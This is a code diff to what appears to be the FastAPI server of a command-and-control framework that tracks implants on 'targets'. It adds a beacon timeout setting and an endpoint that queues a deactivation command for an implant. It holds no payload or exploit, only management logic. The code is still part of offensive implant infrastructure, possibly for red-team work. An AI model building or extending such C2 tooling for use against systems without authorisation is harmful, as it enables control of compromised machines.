@@ -43,6 +43,7 @@ class TargetResponse(BaseModel):
     status: str
     beacon_interval: int = 60
     beacon_jitter: float = 0.3
+    beacon_timeout: int = 300
 
 
 class StatusRequest(BaseModel):
@@ -52,6 +53,7 @@ class StatusRequest(BaseModel):
 class BeaconConfigRequest(BaseModel):
     beacon_interval: int = 60    # seconds
     beacon_jitter: float = 0.3   # 0.0 – 1.0
+    beacon_timeout: int | None = None  # seconds, 0 = disabled, None = unchanged
 
 
 class KeyStoreResponse(BaseModel):
@@ -107,6 +109,13 @@ def set_beacon_config(
 
     target.beacon_interval = body.beacon_interval
     target.beacon_jitter = body.beacon_jitter
+    if body.beacon_timeout is not None:
+        if body.beacon_timeout < 0:
+            raise HTTPException(
+                status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
+                detail="beacon_timeout must be >= 0 (0 disables auto-deactivation)",
+            )
+        target.beacon_timeout = body.beacon_timeout
     session.add(target)
     session.commit()
     session.refresh(target)
@@ -131,6 +140,34 @@ def set_target_status(
         )
 
     target.status = body.status
+    session.add(target)
+    session.commit()
+    session.refresh(target)
+    return target
+
+
+@router.post("/{target_id}/deactivate", response_model=TargetResponse)
+def deactivate_target(
+    target_id: str,
+    session: Session = Depends(get_session),
+    _user: User = Depends(get_current_user),
+):
+    """Send a deactivation command to the implant and mark the target inactive."""
+    target = session.get(Target, target_id)
+    if not target:
+        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")
+
+    # Queue the deactivation command so the implant shuts down on next beacon
+    cmd = Command(
+        target_id=target_id,
+        command="__deactivate__",
+        original_command="deactivate",
+        module_name="system",
+        status="pending",
+    )
+    session.add(cmd)
+
+    target.status = "inactive"
     session.add(target)
     session.commit()
     session.refresh(target)
